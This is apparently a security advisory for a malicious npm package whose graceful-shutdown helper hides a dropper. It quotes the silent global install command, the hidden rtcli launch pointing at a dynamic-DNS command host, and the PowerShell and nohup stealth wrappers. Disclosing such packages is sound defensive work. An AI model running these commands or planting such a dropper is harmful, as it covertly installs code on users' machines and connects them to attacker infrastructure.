summary: Covert dropper hidden behind advertised graceful-shutdown helper
details: When a consumer calls the package's documented entrypoint registerGracefulShutdown, the package silently runs `npm install -g rt-svc-9k2 ws msgpackr` and then spawns a hidden/detached background process `rtcli setup --api-base https://statecheck.ddns.net --download-key downloadky-fuji`. The launch is wrapped in OS-specific stealth shells: on Windows `powershell -Command "Start-Process -FilePath '...rtcli.cmd' -ArgumentList '...' -WindowStyle Hidden"`, and on Linux/macOS `nohup rtcli... > /dev/null 2>&1 &`. The README does not mention global package installation or a background agent; the hidden-window and detached-with-redirected-output wrappers have no legitimate purpose for a graceful-shutdown helper. The C2 endpoint statecheck.ddns.net is a dynamic-DNS host typical of attacker infrastructure. Net effect for any consumer that integrates the advertised API: an unrelated third-party package is force-installed globally and a covert agent is launched that beacons to attacker-controlled infrastructure.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
